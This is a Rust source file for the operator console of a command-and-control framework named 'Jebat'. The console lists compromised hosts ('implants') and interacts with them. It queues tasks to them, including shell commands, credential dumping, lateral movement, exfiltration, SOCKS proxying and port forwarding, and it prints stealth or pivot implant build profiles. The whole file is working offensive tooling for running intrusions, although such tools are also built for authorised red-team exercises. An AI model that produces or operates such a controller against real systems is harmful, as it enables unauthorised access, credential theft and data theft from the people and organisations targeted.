use crate::client::ApiClient;
use rustyline::DefaultEditor;

const TASK_TYPES: &[(&str, u8)] = &[
    ("shell", 1),
    ("sleep", 2),
    ("exit", 3),
    ("upload", 4),
    ("download", 5),
    ("creddump", 6),
    ("lateral", 7),
    ("exfil", 8),
    ("socks", 9),
    ("portfwd", 10),
];

pub async fn main_loop(api: &ApiClient) {
    let mut rl = DefaultEditor::new().expect("readline init failed");

    println!("\x1b[32m[Jebat CLI]\x1b[0m Operator REPL");
    println!("Commands: implants, interact <id>, build <profile>, tasks <id>, help, quit\n");

    loop {
        let line = match rl.readline("\x1b[32mjebat>\x1b[0m ") {
            Ok(l) => l,
            Err(_) => break,
        };
        let _ = rl.add_history_entry(&line);
        let parts: Vec<&str> = line.trim().split_whitespace().collect();
        if parts.is_empty() {
            continue;
        }

        match parts[0] {
            "quit" | "exit" | "q" => break,
            "help" | "?" => print_help(),
            "implants" | "ls" => {
                match api.list_implants().await {
                    Ok(imps) => {
                        println!(
                            "\n{:<18} {:<16} {:<12} {:<8} {:<10}",
                            "AGENT ID", "HOSTNAME", "USERNAME", "SLEEP", "STATUS"
                        );
                        println!("{}", "-".repeat(66));
                        for imp in &imps {
                            let color = match imp.status.as_str() {
                                "active" => "\x1b[32m",
                                "stale" => "\x1b[33m",
                                _ => "\x1b[31m",
                            };
                            println!(
                                "{:<18} {:<16} {:<12} {:<8} {}{}  \x1b[0m",
                                &imp.agent_id[..16.min(imp.agent_id.len())],
                                imp.hostname,
                                imp.username,
                                format!("{}s", imp.sleep_ms / 1000),
                                color,
                                imp.status,
                            );
                        }
                        println!("\n{} implant(s)\n", imps.len());
                    }
                    Err(e) => eprintln!("error: {}", e),
                }
            }
            "interact" | "use" => {
                if parts.len() < 2 {
                    eprintln!("usage: interact <agent_id>");
                    continue;
                }
                let agent_id = resolve_agent_id(api, parts[1]).await;
                match agent_id {
                    Some(id) => interact_loop(api, &id).await,
                    None => eprintln!("implant not found"),
                }
            }
            "tasks" => {
                if parts.len() < 2 {
                    eprintln!("usage: tasks <agent_id>");
                    continue;
                }
                let agent_id = resolve_agent_id(api, parts[1]).await;
                if let Some(id) = agent_id {
                    match api.list_tasks(&id).await {
                        Ok(tasks) => {
                            for t in &tasks {
                                let status_color = match t.status.as_str() {
                                    "completed" => "\x1b[32m",
                                    "pending" => "\x1b[33m",
                                    _ => "\x1b[0m",
                                };
                                println!(
                                    "  #{:<6} {:<14} {}{}  \x1b[0m",
                                    t.id, t.task_type, status_color, t.status,
                                );
                            }
                        }
                        Err(e) => eprintln!("error: {}", e),
                    }
                }
            }
            "build" => {
                let profile = if parts.len() > 1 { parts[1] } else { "stealth" };
                println!("\n# Profile: {}\n", profile);
                println!("{}", crate::generate_profile(profile));
            }
            _ => eprintln!("unknown command: {}. Type 'help' for usage.", parts[0]),
        }
    }
}

pub async fn interact_loop(api: &ApiClient, agent_id: &str) {
    let mut rl = DefaultEditor::new().expect("readline init failed");

    let short_id = &agent_id[..8.min(agent_id.len())];
    println!("\n\x1b[32m[Jebat]\x1b[0m Interacting with {}", short_id);
    println!("Commands: shell <cmd>, sleep <ms>, exit, creddump, lateral, exfil, socks, portfwd");
    println!("Type 'back' to return, 'tasks' to list history\n");

    loop {
        let prompt = format!("\x1b[32m{}>\x1b[0m ", short_id);
        let line = match rl.readline(&prompt) {
            Ok(l) => l,
            Err(_) => break,
        };
        let _ = rl.add_history_entry(&line);
        let parts: Vec<&str> = line.trim().split_whitespace().collect();
        if parts.is_empty() {
            continue;
        }

        match parts[0] {
            "back" | "bg" => break,
            "tasks" => {
                match api.list_tasks(agent_id).await {
                    Ok(tasks) => {
                        for t in tasks.iter().take(20) {
                            let out = t
                                .output
                                .as_deref()
                                .map(|o| {
                                    if o.len() > 60 {
                                        format!("{}...", &o[..60])
                                    } else {
                                        o.to_string()
                                    }
                                })
                                .unwrap_or_default();
                            println!("  #{:<6} {:<14} {:<12} {}", t.id, t.task_type, t.status, out);
                        }
                    }
                    Err(e) => eprintln!("error: {}", e),
                }
            }
            "result" => {
                if parts.len() < 2 {
                    eprintln!("usage: result <task_id>");
                    continue;
                }
                if let Ok(tid) = parts[1].parse::<i64>() {
                    match api.get_task(tid).await {
                        Ok(t) => {
                            println!("Task #{}: {} ({})", t.id, t.task_type, t.status);
                            if let Some(out) = &t.output {
                                println!("{}", out);
                            }
                        }
                        Err(e) => eprintln!("error: {}", e),
                    }
                }
            }
            _ => {
                let (task_type, data) = resolve_task(parts[0], &parts[1..]);
                match api.queue_task(agent_id, task_type, &data).await {
                    Ok(tid) => println!("\x1b[33m[queued task #{}]\x1b[0m", tid),
                    Err(e) => eprintln!("error: {}", e),
                }
            }
        }
    }
}

fn resolve_task(cmd: &str, args: &[&str]) -> (u8, String) {
    let data = args.join(" ");
    for &(name, id) in TASK_TYPES {
        if cmd == name {
            return (id, data);
        }
    }
    (1, format!("{} {}", cmd, data).trim().to_string())
}

async fn resolve_agent_id(api: &ApiClient, partial: &str) -> Option<String> {
    if partial.len() >= 32 {
        return Some(partial.to_string());
    }
    match api.list_implants().await {
        Ok(imps) => imps
            .iter()
            .find(|i| i.agent_id.starts_with(partial))
            .map(|i| i.agent_id.clone()),
        Err(_) => None,
    }
}

fn print_help() {
    println!(
        r#"
  implants / ls        List all implants
  interact <id>        Start interacting with an implant
  tasks <id>           List tasks for an implant
  build [profile]      Generate implant config (stealth/noisy/pivot)
  help / ?             Show this help
  quit / exit / q      Exit the CLI
"#
    );
}
